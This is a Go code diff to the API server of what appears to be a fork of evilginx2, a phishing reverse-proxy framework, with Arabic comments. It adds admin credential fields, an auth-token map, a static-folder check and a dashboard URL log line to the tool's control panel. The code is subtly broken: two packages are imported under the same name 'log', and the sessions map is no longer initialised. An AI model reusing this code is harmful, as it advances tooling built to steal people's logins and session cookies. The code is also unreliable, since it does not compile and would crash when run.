@@ -5,6 +5,8 @@ import (
 	"fmt"
 	"log"
 	"net/http"
+	"os"
+	"path/filepath"
 	"strconv"
 	"strings"
 	"time"
@@ -13,6 +15,7 @@ import (
 
 	"github.com/gorilla/mux"
 	"github.com/kgretzky/evilginx2/database"
+	"github.com/kgretzky/evilginx2/log"
 )
 
 type ApiServer struct {
@@ -29,6 +32,10 @@ type ApiServer struct {
 	sessions    map[string]*database.Session
 	router      *mux.Router
 	authToken   string
+	auto_verify bool
+	auth_tokens map[string]time.Time
+	admin_username string
+	admin_password string
 }
 
 type ApiResponse struct {
@@ -42,8 +49,8 @@ type Auth struct {
 	apiServer *ApiServer
 }
 
-// NewApiServer ينشئ خادم API جديدًا
-func NewApiServer(host string, port int, username string, password string, cfg *Config, db *database.Database) (*ApiServer, error) {
+// NewApiServer ينشئ خادم API جديد
+func NewApiServer(host string, port int, admin_username string, admin_password string, cfg *Config, db *database.Database) (*ApiServer, error) {
 	if cfg == nil {
 		return nil, fmt.Errorf("تكوين فارغ")
 	}
@@ -56,13 +63,14 @@ func NewApiServer(host string, port int, username string, password string, cfg *
 	token := generateRandomToken(32)
 	
 	return &ApiServer{
-		host:       host,
-		port:       port,
-		cfg:        cfg,
-		db:         db,
-		username:   username,
-		password:   password,
-		sessions:   make(map[string]*database.Session),
+		host: host,
+		port: port,
+		cfg:  cfg,
+		db:   db,
+		auto_verify: false,
+		auth_tokens: make(map[string]time.Time),
+		admin_username: admin_username,
+		admin_password: admin_password,
 		authToken:  token,
 	}, nil
 }
@@ -95,6 +103,15 @@ func (as *ApiServer) SetCredentials(username, password string) {
 func (as *ApiServer) Start() {
 	router := mux.NewRouter()
 	router.Use(as.handleHeaders)
+	
+	// التحقق من مسار الملفات الثابتة
+	log.Debug("تحميل الملفات الثابتة من المسار: ./static")
+	if _, err := os.Stat("./static"); os.IsNotExist(err) {
+		log.Error("مجلد الملفات الثابتة (static) غير موجود في: ./static")
+	} else {
+		log.Success("تم العثور على مجلد الملفات الثابتة (static) في: ./static")
+	}
+	
 	router.HandleFunc("/health", as.healthHandler).Methods("GET")
 
 	// طرق API للمصادقة
@@ -156,7 +173,8 @@ func (as *ApiServer) Start() {
 	as.router = router
 
 	bind := fmt.Sprintf("%s:%d", as.host, as.port)
-	fmt.Printf("Starting API server on: %s\n", bind)
+	log.Info("خادم API يستمع على %s", bind)
+	log.Info("يمكنك الوصول إلى لوحة التحكم عبر http://%s/static/dashboard.html", bind)
 	go http.ListenAndServe(bind, router)
 }
 
